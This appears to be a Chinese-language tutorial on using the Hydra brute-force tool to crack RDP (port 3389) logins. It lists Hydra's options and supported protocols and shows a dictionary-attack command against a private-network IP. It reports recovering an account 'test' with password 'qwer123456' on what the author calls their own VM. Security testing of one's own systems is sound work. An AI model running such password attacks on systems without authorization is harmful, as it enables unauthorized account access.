### 在线破解工具Hydra爆破3389服务器
hydra是一款全能的暴力破解工具，功能强大，几乎支持所有的协议，是著名黑客组织thc开发的。

在Kali Linux下已经是默认安装的，于是测试爆破一下自己的一台VM虚拟机服务器。hydra还支持GUI图形界面(xhydra)，不过习惯还是命令好用。

(爆破3389端口终端登录的帐号和密码 协议：rdp)

帮助命令：hydra -h  //查看基本用法

参数说明：

#
	hydra [[[-l login|-L file] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
	[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w time] [-f] [-s PORT] [-S] [-vV]
	server service [OPT]
	-R 继续从上一次进度接着破解。
	-S 采用SSL链接。
	-s PORT 可通过这个参数指定非默认端口。
	-l LOGIN 指定破解的用户，对特定用户破解。
	-L FILE 指定用户名字典。
	-p PASS 小写，指定密码破解，少用，一般是采用密码字典。
	-P FILE 大写，指定密码字典。
	-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。
	-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
	-M FILE 指定目标列表文件一行一条。
	-o FILE 指定结果输出文件。
	-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
	-t TASKS 同时运行的线程数，默认为16。
	-w TIME 设置最大超时的时间，单位秒，默认是30s。
	-v / -V 显示详细过程。
	server 目标ip
	service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb
	smbnt http-{head|get} 
	http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql
	mysql oracle-listener 
	postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-
	auth[-ntlm] pcanywhere 
	teamspeak sip vmauthd firebird ncp afp等等。	
#

#### 爆破过程：
![](https://github.com/silence940109/Java/blob/master/Linux_Hydra/image/777998-20160129150436380-748025426.jpg)

其中命令：hydra 192.168.1.12 rdp -L users.txt -P pass.txt -V 

192.168.12是目标服务器的IP地址

rdp 是协议

-L 指定一个帐号字典

-P 指定一个密码字典

-V 现实爆破测试的详细过程

![](https://github.com/silence940109/Java/blob/master/Linux_Hydra/image/777998-20160129150850818-876268901.jpg)

爆破成功，成功破解出帐号为test，密码为qwer123456  开始测试登录服务器

![](https://github.com/silence940109/Java/blob/master/Linux_Hydra/image/777998-20160129150954068-1302053372.jpg)

